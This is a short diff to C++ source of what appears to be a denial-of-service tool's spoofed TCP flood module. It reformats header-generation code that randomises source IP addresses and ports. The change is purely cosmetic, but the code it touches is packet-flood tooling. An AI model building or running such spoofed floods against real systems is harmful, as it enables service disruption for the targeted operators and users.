@@ -4,7 +4,8 @@
 #include <cstring>
 
 spoofed_tcp_flood::spoofed_tcp_flood(std::shared_ptr<Config> config) :
-                                        base_spoofed_flood(std::move(config), IPPROTO_TCP) {
+										base_spoofed_flood(std::move(config),
+												IPPROTO_TCP) {
 
 }
 
@@ -23,17 +24,15 @@ char *spoofed_tcp_flood::gen_hdr(sockaddr_in *dst, int len) {
     if(config->rand_lhost){
         utils::randomizer::randomIP(ipaddr);
         ip->saddr = inet_addr(ipaddr.c_str());
-    }else{
+    }else
         ip->saddr = 0;
-    }
 
     ip->tot_len = htons((uint16_t) len);
 
-    if(config->rand_lport){
+    if(config->rand_lport)
         tcp->th_sport = htons((uint16_t) utils::randomizer::randomPort());
-    }else{
+    else
         tcp->th_sport = 0;
-    }
 
     finalize_hdr(tcp, ip);
 
